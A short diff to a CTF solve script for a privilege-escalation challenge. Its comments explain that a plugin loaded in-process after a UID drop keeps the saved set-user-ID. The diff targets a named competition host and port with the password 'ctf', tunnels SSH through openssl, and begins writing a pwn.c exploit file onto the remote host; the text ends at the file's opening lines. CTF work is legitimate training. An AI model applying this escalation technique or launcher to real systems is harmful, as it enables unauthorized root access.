@@ -6,12 +6,18 @@
 # point -- and auditdrop loads the player's plugin *in-process* after the
 # drop. A child process would NOT work: execve() copies the effective UID
 # into the saved set-user-ID.
+#
+# The service sits behind Traefik's TLS entrypoint (the mapped tcp-ssl port),
+# so SSH is wrapped in `openssl s_client`.
+#
+# Usage: solve.sh [host] [port]      (password: ctf)
 set -euo pipefail
 
-HOST="${1:?usage: solve.sh <host> [port]}"
-PORT="${2:-22}"
+HOST="${1:-sudoers.challs.ingeniums.club}"
+PORT="${2:-9450}"
 
-ssh -p "$PORT" ctf@"$HOST" 'bash -s' <<'REMOTE'
+ssh -o ProxyCommand='openssl s_client -quiet -servername %h -connect %h:%p' \
+    -p "$PORT" ctf@"$HOST" 'bash -s' <<'REMOTE'
 set -e
 cat > /home/ctf/notes/pwn.c <<'EOF'
 #include <stdio.h>
